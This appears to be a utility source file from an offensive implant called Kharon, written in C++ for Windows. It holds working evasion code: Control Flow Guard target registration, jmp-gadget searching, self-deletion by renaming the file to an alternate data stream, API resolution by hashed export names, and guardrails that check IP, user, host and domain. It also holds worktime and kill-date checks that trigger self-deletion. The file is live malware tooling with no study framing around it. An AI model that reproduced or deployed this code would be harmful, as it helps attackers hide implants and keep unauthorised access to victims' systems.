#include <Kharon.h>

using namespace Root;

auto DECLFN Useful::NtStatusToError(
    _In_ NTSTATUS NtStatus
) -> ERROR_CODE {
    ULONG WinError = Self->Ntdll.RtlNtStatusToDosError( NtStatus );
    KhSetError( WinError ); return WinError;
}

auto DECLFN Useful::CfgAddrAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
) -> VOID {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    IMAGE_NT_HEADERS*    NtHdrs   = { 0 };
    ULONG                Output   = 0x00;
    NTSTATUS             Status   = STATUS_SUCCESS;

    NtHdrs                  = (IMAGE_NT_HEADERS*)( U_PTR( ImageBase ) + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
    MemRange.NumberOfBytes  = (SIZE_T)( NtHdrs->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
    MemRange.VirtualAddress = ImageBase;

    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = U_PTR( Function ) - U_PTR( ImageBase );

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Self->Ntdll.NtSetInformationVirtualMemory( 
        NtCurrentProcess(), VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo )
    );

    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }
}

auto DECLFN Useful::CfgPrivAdd(
    _In_ HANDLE hProcess,
    _In_ PVOID  Address,
    _In_ DWORD  Size
) -> VOID {
    CFG_CALL_TARGET_INFO Cfg      = { 0 };
    MEMORY_RANGE_ENTRY   MemRange = { 0 };
    VM_INFORMATION       VmInfo   = { 0 };
    IMAGE_NT_HEADERS*    NtHeader = { 0 };
    ULONG                Output   = { 0 };
    NTSTATUS             Status   = { 0 };

    MemRange.NumberOfBytes  = Size;
    MemRange.VirtualAddress = Address;
    
    Cfg.Flags  = CFG_CALL_TARGET_VALID;
    Cfg.Offset = 0;

    VmInfo.dwNumberOfOffsets = 1;
    VmInfo.plOutput          = &Output;
    VmInfo.ptOffsets         = &Cfg;
    VmInfo.pMustBeZero       = FALSE;
    VmInfo.pMoarZero         = FALSE;

    Status = Self->Ntdll.NtSetInformationVirtualMemory( 
        hProcess, VmCfgCallTargetInformation, 1, &MemRange, &VmInfo, sizeof( VmInfo ) 
    );

    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }
}

auto DECLFN Useful::CfgCheck( VOID ) -> BOOL {
    NTSTATUS Status = STATUS_SUCCESS;
    EXTENDED_PROCESS_INFORMATION ProcInfoEx = { 0 };

    ProcInfoEx.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    ProcInfoEx.ExtendedProcessInfoBuffer = 0;
    
    Status = Self->Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(),
        ProcessCookie | ProcessUserModeIOPL,
        &ProcInfoEx,
        sizeof( ProcInfoEx ),
        NULL
    );
    if ( Status != STATUS_SUCCESS ) {
        KhDbg( "failed with status: %X", Status );
    }

    KhDbg( "Control Flow Guard (CFG) Enabled: %s", ProcInfoEx.ExtendedProcessInfoBuffer ? "TRUE" : "FALSE" );
    return ProcInfoEx.ExtendedProcessInfoBuffer;
}

auto DECLFN Useful::FindGadget(
    _In_ UPTR   ModuleBase,
    _In_ UINT16 RegValue
) -> UPTR {
    UPTR   Gadget         = 0;
    UPTR   GadgetList[10] = { 0 };
    ULONG  GadgetCounter  = 0;
    ULONG  RndIndex       = 0;
    BYTE*  SearchBase     = nullptr;
    SIZE_T SearchSize     = 0;
    UINT16 JmpValue       = 0xff;

    SearchBase = B_PTR( ModuleBase + 0x1000 );
    SearchSize = this->SecSize( ModuleBase, Hsh::Str<CHAR>(".text") );

    for ( INT i = 0; i < SearchSize - 1; i++ ) {
        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
            GadgetList[GadgetCounter] = U_PTR( SearchBase + i ); GadgetCounter++;
            if ( GadgetCounter == 10 ) break;
        }
    }

    RndIndex = Rnd32() % GadgetCounter;
    Gadget   = GadgetList[RndIndex];

    return Gadget;
}

auto DECLFN Useful::SecVa(
    _In_ UPTR LibBase,
    _In_ UPTR SecHash
) -> ULONG {
    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };

    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );

    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;

    SecHdr = IMAGE_FIRST_SECTION( Header );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
            return SecHdr[i].VirtualAddress;
        }
    }

    return 0;
}

auto DECLFN Useful::SecSize(
    _In_ UPTR LibBase,
    _In_ UPTR SecHash
) -> ULONG {
    IMAGE_NT_HEADERS*     Header = { 0 };
    IMAGE_SECTION_HEADER* SecHdr = { 0 };

    Header = (IMAGE_NT_HEADERS*)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );

    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;

    SecHdr = IMAGE_FIRST_SECTION( Header );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
            return SecHdr[i].SizeOfRawData;
        }
    }

    return 0;
} 

auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
    WCHAR path[MAX_PATH*2];
    if ( ! Self->Krnl32.GetModuleFileNameW( nullptr, path, sizeof( path ) ) ) {
        return EXIT_FAILURE;
    }

    auto FileHandle = Self->Krnl32.CreateFileW( 
        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, 
        nullptr, OPEN_EXISTING, 0, nullptr 
    );
    if ( FileHandle == INVALID_HANDLE_VALUE ) {
        return FALSE;
    }

    const auto NewStream  = L":redxvz";
    const auto StreamSize = Str::LengthW( NewStream ) * sizeof(WCHAR);
    const auto RenameSize = sizeof(FILE_RENAME_INFO) + StreamSize;
    const auto RenamePtr  = (PFILE_RENAME_INFO)hAlloc( RenameSize ); 
    if ( ! RenamePtr ) { return FALSE; }

    RenamePtr->FileNameLength  = StreamSize;
    RenamePtr->ReplaceIfExists = FALSE;
    RenamePtr->RootDirectory   = nullptr;

    Mem::Copy( RenamePtr->FileName, (PVOID)NewStream, StreamSize );
    
    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, FileRenameInfo, RenamePtr, RenameSize) ) {
        return FALSE;
    }

    FILE_DISPOSITION_INFO_EX info = { FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
    if ( ! Self->Krnl32.SetFileInformationByHandle(FileHandle, static_cast<FILE_INFO_BY_HANDLE_CLASS>(FileDispositionInfoEx), &info, sizeof(info))) {
        return FALSE;
    }

    Self->Ntdll.NtClose(FileHandle);

    FileHandle = Self->Krnl32.CreateFileW(
        path, DELETE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_DELETE, 
        nullptr, OPEN_EXISTING, 0, nullptr
    );


    KhDbg("[+] Self file deletion succefully\n");

    Self->Ntdll.NtClose( FileHandle );
    if ( RenamePtr ) hFree( RenamePtr );

    return TRUE;
}

auto DECLFN Useful::CheckWorktime( VOID ) -> BOOL {
    G_KHARON

    if ( 
        ! Self->Config.Worktime.Enabled
    ) return TRUE;

    SYSTEMTIME SystemTime = { 0 };

    VOID ( *mGetLocalTime )( PSYSTEMTIME ) = ( decltype( mGetLocalTime ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "kernel32.dll" ) ), Hsh::Str( "GetLocalTime" ) );

    mGetLocalTime( &SystemTime );

    WORD CurrentTimeInMinutes = (SystemTime.wHour * 60) + SystemTime.wMinute;
    WORD StartTimeInMinutes   = (Self->Config.Worktime.StartHour * 60) + Self->Config.Worktime.StartMin;
    WORD EndTimeInMinutes     = (Self->Config.Worktime.EndHour * 60) + Self->Config.Worktime.EndMin;

    if ( StartTimeInMinutes <= EndTimeInMinutes ) {
        return ( CurrentTimeInMinutes >= StartTimeInMinutes && CurrentTimeInMinutes <= EndTimeInMinutes );
    } else {
        return ( CurrentTimeInMinutes >= StartTimeInMinutes || CurrentTimeInMinutes <= EndTimeInMinutes );
    }
}

static auto DECLFN ParseIpAddress( CHAR* IpStr ) -> ULONG {
    ULONG result = 0;
    INT32 octet = 0;
    INT32 shift = 0;  
    
    for ( INT32 i = 0; IpStr[i] != '\0'; i++ ) {
        if ( IpStr[i] >= '0' && IpStr[i] <= '9' ) {
            octet = octet * 10 + ( IpStr[i] - '0' );
        } else if ( IpStr[i] == '.' ) {
            result |= ( octet << shift );
            shift += 8;
            octet = 0;
        }
    }
    result |= ( octet << shift );  
    return result;
}

static auto DECLFN ParseInt( CHAR* str, INT32* outVal ) -> INT32 {
    INT32 val = 0;
    INT32 i = 0;
    
    while ( str[i] >= '0' && str[i] <= '9' ) {
        val = val * 10 + ( str[i] - '0' );
        i++;
    }
    
    *outVal = val;
    return i;
}

static auto DECLFN IpMatchesGuardrail( ULONG localIp, CHAR* guardPattern ) -> BOOL {
    INT32 slashPos = -1;
    for ( INT32 i = 0; guardPattern[i] != '\0'; i++ ) {
        if ( guardPattern[i] == '/' ) {
            slashPos = i;
            break;
        }
    }
    
    if ( slashPos > 0 ) {
        CHAR baseIp[16] = { 0 };
        for ( INT32 i = 0; i < slashPos && i < 15; i++ ) {
            baseIp[i] = guardPattern[i];
        }
        
        INT32 prefixLen = 0;
        ParseInt( guardPattern + slashPos + 1, &prefixLen );
        
        ULONG baseIpAddr = ParseIpAddress( baseIp );

        ULONG mask = 0;
        if ( prefixLen >= 32 ) {
            mask = 0xFFFFFFFF;
        } else if ( prefixLen > 0 ) {
            mask = ( 1ULL << prefixLen ) - 1;
        }
        
        ULONG localMasked = localIp & mask;
        ULONG baseMasked = baseIpAddr & mask;
        
        UCHAR* localBytes = ( UCHAR* )&localIp;
        UCHAR* baseBytes = ( UCHAR* )&baseIpAddr;
        BOOL match = ( localMasked == baseMasked );
        
        return match;
    }
    
    INT32 dashPos = -1;
    for ( INT32 i = 0; guardPattern[i] != '\0'; i++ ) {
        if ( guardPattern[i] == '-' ) {
            dashPos = i;
            break;
        }
    }
    
    if ( dashPos > 0 ) {
        CHAR baseIp[16] = { 0 };
        for ( INT32 i = 0; i < dashPos && i < 15; i++ ) {
            baseIp[i] = guardPattern[i];
        }
        
        INT32 endOctet = 0;
        ParseInt( guardPattern + dashPos + 1, &endOctet );
        
        ULONG baseIpAddr = ParseIpAddress( baseIp );
        
        ULONG baseLastOctet = ( baseIpAddr >> 24 ) & 0xFF; 
        ULONG networkPrefix = baseIpAddr & 0x00FFFFFF;     
        
        ULONG localLastOctet = ( localIp >> 24 ) & 0xFF;
        ULONG localNetworkPrefix = localIp & 0x00FFFFFF;
        
        UCHAR* localBytes = ( UCHAR* )&localIp;
        UCHAR* baseBytes = ( UCHAR* )&baseIpAddr;

        
        if ( localNetworkPrefix == networkPrefix ) {
            BOOL match = ( localLastOctet >= baseLastOctet && localLastOctet <= endOctet );

            return match;
        }
        return FALSE;
    }
    
    ULONG guardIp = ParseIpAddress( guardPattern );
    
    UCHAR* localBytes = ( UCHAR* )&localIp;
    UCHAR* guardBytes = ( UCHAR* )&guardIp;

    return localIp == guardIp;
}

auto DECLFN Guardrails( VOID ) -> BOOL {
    CHAR* IpGuard     = KH_GUARDRAILS_IPADDRESS;
    CHAR* UserGuard   = KH_GUARDRAILS_USER;
    CHAR* DomainGuard = KH_GUARDRAILS_DOMAIN;
    CHAR* HostGuard   = KH_GUARDRAILS_HOST;

    INT32 IpFlag     = Str::LengthA( IpGuard    );
    INT32 UserFlag   = Str::LengthA( UserGuard   );
    INT32 DomainFlag = Str::LengthA( DomainGuard );
    INT32 HostFlag   = Str::LengthA( HostGuard   );

    if ( 
        ! IpFlag     &&
        ! UserFlag   &&
        ! DomainFlag && 
        ! HostFlag
    ) return FALSE;

    ULONG TmpValue = 0;

    HMODULE ( *mLoadLibraryA )( LPCSTR ) = ( decltype( mLoadLibraryA ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "kernel32.dll" ) ), Hsh::Str( "LoadLibraryA" ) );

    if ( mLoadLibraryA ) {
        mLoadLibraryA( "advapi32.dll" );
    }
    BOOL ( *mGetUserNameA )( CHAR*, PULONG ) = ( decltype( mGetUserNameA ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "advapi32.dll" ) ), Hsh::Str( "GetUserNameA" ) );
    BOOL ( *mGetComputerNameExA )( COMPUTER_NAME_FORMAT, CHAR*, PULONG ) = ( decltype( mGetComputerNameExA ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "kernel32.dll" ) ), Hsh::Str( "GetComputerNameExA" ) );

    if ( IpFlag ) {
        BOOL IpMatch = FALSE;
        
        if ( mLoadLibraryA ) {
            mLoadLibraryA( "iphlpapi.dll" );
        }
        ULONG ( *mGetIpForwardTable )( PVOID, PULONG, BOOL ) = ( decltype( mGetIpForwardTable ) )LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "iphlpapi.dll" ) ), Hsh::Str( "GetIpForwardTable" ) );
        
        if ( mGetIpForwardTable ) {
            UCHAR StackBuffer[16384];
            ULONG dwSize = sizeof( StackBuffer );
            
            if ( mGetIpForwardTable( StackBuffer, &dwSize, FALSE ) == 0 ) {
                ULONG* pNumEntries = ( ULONG* )StackBuffer;
                ULONG numEntries = *pNumEntries;
                
                UCHAR* pEntries = StackBuffer + sizeof( ULONG );
                
                const INT32 NEXTHOP_OFFSET = 12;
                const INT32 ROW_SIZE = 56; 
                
                for ( ULONG i = 0; i < numEntries && !IpMatch; i++ ) {
                    ULONG* pNextHop = ( ULONG* )( pEntries + ( i * ROW_SIZE ) + NEXTHOP_OFFSET );
                    ULONG localIp = *pNextHop;
                    
                    if ( localIp != 0 ) {
                        UCHAR* bytes = ( UCHAR* )&localIp;
                        
                        if ( IpMatchesGuardrail( localIp, IpGuard ) ) {
                            IpMatch = TRUE;
                        }
                    }
                }
            }
        }
        
        if ( ! IpMatch ) {
            return TRUE;
        }
    }

	if ( UserFlag ) {
        CHAR  UserLocal[MAX_PATH] = { 0 };
        ULONG UserLocalSize       = sizeof( UserLocal );
        
        if ( mGetUserNameA && mGetUserNameA( UserLocal, &UserLocalSize ) ) {
            Str::ToLowerChar( UserLocal );
            Str::ToLowerChar( UserGuard );

            if ( Str::CompareA( UserLocal, UserGuard ) != 0 ) return TRUE;
        }
    }
    if ( HostFlag ) {
        CHAR  HostLocal[MAX_PATH] = { 0 };
        ULONG HostLocalSize = sizeof( HostLocal );

        if ( mGetComputerNameExA && mGetComputerNameExA( ComputerNameDnsHostname, HostLocal, &HostLocalSize ) ) {
            Str::ToLowerChar( HostLocal );
            Str::ToLowerChar( HostGuard );

            if ( Str::CompareA( HostLocal, HostGuard ) != 0 ) return TRUE;
        }
    }

    if ( DomainFlag ) {
        CHAR  DomainLocal[MAX_PATH] = { 0 };
        ULONG DomainLocalSize = sizeof( DomainLocal );

        if ( mGetComputerNameExA && mGetComputerNameExA( ComputerNameDnsDomain, DomainLocal, &DomainLocalSize ) ) {
            Str::ToLowerChar( DomainLocal );
            Str::ToLowerChar( DomainGuard );

            if ( Str::CompareA( DomainLocal, DomainGuard ) != 0 ) return TRUE;
        }
    }

    return FALSE;
}

auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
    SYSTEMTIME SystemTime  = { 0 };
    BOOL       SelfDeleted = FALSE;

    if ( Self->Config.KillDate.Enabled ) {
        KhDbg("[====== Checking Killdate ======]");

        Self->Krnl32.GetSystemTime( &SystemTime );

        KhDbg( 
            "the current system date is %d-%d-%d | format year-month-day",
            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay
        );
        KhDbg(
            "kill date is set to %d-%d-%d | format year-month-day",
            Self->Config.KillDate.Year, Self->Config.KillDate.Month, Self->Config.KillDate.Day
        );

        if (
            SystemTime.wDay   == Self->Config.KillDate.Day   &&
            SystemTime.wMonth == Self->Config.KillDate.Month &&
            SystemTime.wYear  == Self->Config.KillDate.Year
        ) {
            KhDbg( "match kill date with current system date" );
            KhDbg( "self-deletion enabled: %s", Self->Config.KillDate.SelfDelete ? "true":"false" );
            KhDbg( "exit choosed is: %s", Self->Config.KillDate.ExitProc ? "process":"thread" );
            KhDbg( "starting self deletion and stop the process" );

            SelfDeleted = Self->Usf->SelfDelete();

            KhDbg( "self-deleted: %s", SelfDeleted ? "true":"false" );
            KhDbg( "exiting the %s with EXIT_SUCCESS code", Self->Config.KillDate.ExitProc ? "process":"thread" );

            if ( Self->Config.KillDate.ExitProc ) {
                Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
            } else {
                Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
            }
        }

        KhDbg("[====== Ending Check ======]\n");
    }
}

auto DECLFN LdrLoad::Module(
    _In_ const ULONG LibHash
) -> UPTR {
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        if ( !LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }

        if ( Hsh::Str<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
 
     return 0;
}
 
auto DECLFN LdrLoad::_Api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR {
    auto FuncPtr    = UPTR { 0 };
    auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
    auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
    auto ExpDir     = PIMAGE_EXPORT_DIRECTORY { nullptr };
    auto ExpNames   = PDWORD { nullptr };
    auto ExpAddress = PDWORD { nullptr };
    auto ExpOrds    = PWORD { nullptr };
    auto SymbName   = PSTR { nullptr };

    DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
        return 0;
    }

    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
    if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
        return 0;
    }

    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
    ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
        SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );

        if ( Hsh::Str( SymbName ) != SymbHash ) {
            continue;
        }

        FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];

        break;
    }

    return FuncPtr;
}

auto DECLFN Mem::Copy(
    _In_ PVOID Dst,
    _In_ PVOID Src,
    _In_ ULONG Size
) -> PVOID {
    BYTE* D = (BYTE*)Dst;
	BYTE* S = (BYTE*)Src;

	while (Size--)
		*D++ = *S++;
	return Dst;
}

auto DECLFN Mem::Cmp(
    _In_ PBYTE  Addr1,
    _In_ PBYTE  Addr2,
    _In_ SIZE_T Size
) -> BOOL {
    if ( Addr1 == nullptr || Addr2 == nullptr ) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < Size; i++) {
        if (Addr1[i] != Addr2[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

auto DECLFN Mem::Set(
    _In_ UPTR Addr,
    _In_ UPTR Val,
    _In_ UPTR Size
) -> void {
    ULONG* Dest = (ULONG*)Addr;
	SIZE_T Count = Size / sizeof(ULONG);

	while ( Count > 0 ) {
		*Dest = Val; Dest++; Count--;
	}

	return;
}

EXTERN_C void* DECLFN memset(void* ptr, int value, size_t num) {
    Mem::Set((UPTR)ptr, value, num);
    return ptr;
}

EXTERN_C void* DECLFN memcpy(void *__restrict__ _Dst, const void *__restrict__ _Src, size_t _Size) {
    return Mem::Copy( _Dst, (PVOID)_Src, _Size );
}

auto DECLFN Mem::Zero(
    _In_ UPTR Addr,
    _In_ UPTR Size
) -> void {
    Mem::Set( Addr, 0, Size );
}

auto DECLFN Str::WCharToChar( 
    PCHAR  Dest, 
    PWCHAR Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while (--Length > 0) {
        if (!(*Dest++ = static_cast<CHAR>(*Src++))) {
            return MaxAllowed - Length - 1;
        }
    }
    return MaxAllowed - Length;
}

auto DECLFN Str::CharToWChar( 
    PWCHAR Dest, 
    PCHAR  Src, 
    SIZE_T MaxAllowed 
) -> SIZE_T {
    SIZE_T Length = MaxAllowed;
    while ( --Length > 0 ) {
        if ( !( *Dest++ = static_cast<WCHAR>( *Src++ ) ) ) {
            return MaxAllowed - Length;
        }
    }
    *Dest = L'\0';
    return MaxAllowed - Length;
}

auto DECLFN Str::LengthA( 
    LPCSTR String 
) -> SIZE_T {
    LPCSTR End = String;
    while (*End) ++End;
    return End - String;
}

auto DECLFN Str::LengthW( 
    LPCWSTR String 
) -> SIZE_T {
    if (!String) {  
        return 0;
    }

    LPCWSTR End = String;
    while (*End) {
        ++End;
    }
    return static_cast<SIZE_T>(End - String);
}

auto DECLFN Str::CompareWCountL(
    const wchar_t* str1,
    const wchar_t* str2,
    size_t count
) -> int {
    if (count == 0) return 0;
    if (!str1 || !str2) return (!str1 && !str2) ? 0 : (!str1 ? -1 : 1);

    while (count-- > 0) {
        int diff = Str::ToLowerWcharc(*str1) - Str::ToLowerWcharc(*str2);
        if (diff != 0) return diff;
        if (*str1 == L'\0') break;
        str1++;
        str2++;
    }
    return 0;
}

auto DECLFN Str::CompareCountW( 
    PCWSTR Str1, 
    PCWSTR Str2, 
    INT16  Count 
) -> INT {  
    if (!Str1 || !Str2) {
        return Str1 ? 1 : (Str2 ? -1 : 0);
    }

    for (INT16 Idx = 0; Idx < Count; ++Idx) {
        if (Str1[Idx] != Str2[Idx]) {
            return static_cast<INT16>(Str1[Idx]) - static_cast<INT16>(Str2[Idx]);
        }
        if (Str1[Idx] == L'\0') {  
            return 0;
        }
    }

    return 0;  
}

auto DECLFN Str::CompareCountA( 
    PCSTR Str1, 
    PCSTR Str2, 
    INT16 Count 
) -> INT {
    INT16 Idx = 0;

    while (*Str1 && (*Str1 == *Str2) && Idx < Count) {
        ++Str1;
        ++Str2;

        Idx++;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::CompareA( 
    LPCSTR Str1, 
    LPCSTR Str2 
) -> INT {
    while (*Str1 && (*Str1 == *Str2)) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>(*Str1) - static_cast<INT>(*Str2);
}

auto DECLFN Str::StartsWith(
    BYTE* Str, 
    BYTE* Prefix
) -> BOOL {
    if (!Str || !Prefix) {
        return FALSE;
    }

    while (*Prefix) {
        if (*Str != *Prefix) {
            return FALSE; 
        }
        ++Str;
        ++Prefix;
    }
    return TRUE;
}

auto DECLFN Str::CompareW( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> INT {
    while ( *Str1 && ( *Str1 == *Str2 ) ) {
        ++Str1;
        ++Str2;
    }
    return static_cast<INT>( *Str1 ) - static_cast<INT>( *Str2 );
}

auto DECLFN Str::ToUpperChar(
    char* str
) -> VOID {
    while (*str) {
        if (*str >= 'a' && *str <= 'z') {
            *str = *str - ('a' - 'A');
        }
        str++;
    }
}

auto DECLFN Str::ToLowerChar( 
    PCHAR Str
) -> VOID {
    while (*Str) {
        if (*Str >= 'A' && *Str <= 'Z') {
            *Str += ('a' - 'A');
        }
        ++Str;
    }
}

auto DECLFN Str::ToLowerWcharc( 
    WCHAR Ch 
) -> WCHAR {
    return (Ch >= L'A' && Ch <= L'Z') ? Ch + (L'a' - L'A') : Ch;
}

auto DECLFN Str::ToLowerWchar( 
    WCHAR* str 
) -> void {
    if (!str) return;
    
    while (*str) {
        if (*str >= L'A' && *str <= L'Z') {
            *str = *str + (L'a' - L'A');
        }
        str++;
    }
}

auto DECLFN Str::CopyA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    PCHAR p = Dest;
    while ((*p++ = *Src++));
    return Dest;
}

auto DECLFN Str::CopyW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    PWCHAR p = Dest;
    while ( ( *p++ = *Src++ ) );
    return Dest;
}

auto DECLFN Str::ConcatA( 
    PCHAR  Dest, 
    LPCSTR Src 
) -> PCHAR {
    return Str::CopyA( Dest + Str::LengthA(Dest), Src );
}

auto DECLFN Str::ConcatW( 
    PWCHAR  Dest, 
    LPCWSTR Src 
) -> PWCHAR {
    return Str::CopyW( Dest + Str::LengthW(Dest), Src );
}

auto DECLFN Str::IsEqual( 
    LPCWSTR Str1, 
    LPCWSTR Str2 
) -> BOOL {
    WCHAR TempStr1[MAX_PATH], TempStr2[MAX_PATH];
    SIZE_T Length1 = Str::LengthW( Str1 );
    SIZE_T Length2 = Str::LengthW( Str2 );

    if ( Length1 >= MAX_PATH || Length2 >= MAX_PATH ) return FALSE;

    for (SIZE_T i = 0; i < Length1; ++i) {
        TempStr1[i] = Str::ToLowerWcharc( Str1[i] );
    }
    TempStr1[Length1] = L'\0';

    for (SIZE_T j = 0; j < Length2; ++j) {
        TempStr2[j] = Str::ToLowerWcharc( Str2[j] );
    }
    TempStr2[Length2] = L'\0';

    return Str::CompareW( TempStr1, TempStr2 ) == 0;
}

auto DECLFN Str::InitUnicode( 
    PUNICODE_STRING UnicodeString, 
    PWSTR           Buffer 
) -> VOID {
    if (Buffer) {
        SIZE_T Length = Str::LengthW(Buffer) * sizeof(WCHAR);
        if (Length > 0xFFFC) Length = 0xFFFC;

        UnicodeString->Buffer = const_cast<PWSTR>(Buffer);
        UnicodeString->Length = static_cast<USHORT>(Length);
        UnicodeString->MaximumLength = static_cast<USHORT>(Length + sizeof(WCHAR));
    } else {
        UnicodeString->Buffer = nullptr;
        UnicodeString->Length = 0;
        UnicodeString->MaximumLength = 0;
    }
}

// auto DECLFN Str::GenRnd( 
//     ULONG StringSize
// ) -> PCHAR {
//     CHAR  Words[]    = "abcdefghijklmnopqrstuvwxyz0123456789";
//     ULONG WordsLen   = Str::LengthA( Words );
//     ULONG Count      = 0;
//     PSTR  RndString  = A_PTR( Heap().Alloc( StringSize ) );

//     for ( INT i = 0; i < StringSize; i++ ) {
//         ULONG Count  = ( Random32() % WordsLen );
//         Mem::Copy( RndString, &Words[Count] , sizeof( Words[Count] ) + i );
//     }

//     return RndString;
// }

auto DECLFN Rnd32(
    VOID
) -> ULONG {
    UINT32 Seed = 0;

    _rdrand32_step( &Seed );
    
    return Seed;
}

VOID DECLFN volatile ___chkstk_ms(
    VOID
) { __asm__( "nop" ); }
